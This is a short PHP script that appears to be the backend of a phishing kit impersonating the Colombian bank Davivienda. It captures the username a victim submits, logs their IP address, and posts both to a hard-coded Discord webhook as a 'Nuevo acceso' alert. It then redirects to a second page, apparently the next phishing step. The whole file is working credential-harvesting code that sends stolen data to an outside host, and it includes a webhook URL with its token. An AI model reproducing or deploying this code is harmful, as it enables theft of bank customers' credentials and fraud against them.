<?php
session_start();

@ini_set("display_errors", 0);

// Obtener IP real del usuario
function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Puede contener múltiples IPs. Tomamos la primera válida.
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$myip = getRealIP();
$_SESSION['user_ip'] = $myip;

if (isset($_POST['bg1'])) {
    $usuario = $_POST['bg1'];

    $_SESSION['usuario'] = $usuario;

    // Webhook de Discord
    $webhookUrl = "https://discord.com/api/webhooks/1548193159836729398/5yGbDhkeCM_KweT4fbCXMKqg6nx_MZoxtXe9WfgAkVeoNz8v-517TZFgoa3g03bp4-7q";

    // Contenido con el usuario en bloque de código (triple backtick)
    $content = "‼️ **Nuevo acceso**\n**Usuario:**\n```\n$usuario\n```\n**IP:** `$myip`";

    $data = [
        'username' => 'davivienda paso 1',
        'content'  => $content
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'ignore_errors' => true
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($webhookUrl, false, $context);

    header('Location: ./index2.php');
    exit();
} else {
    header('Location: ./index2.php');
    exit();
}
?>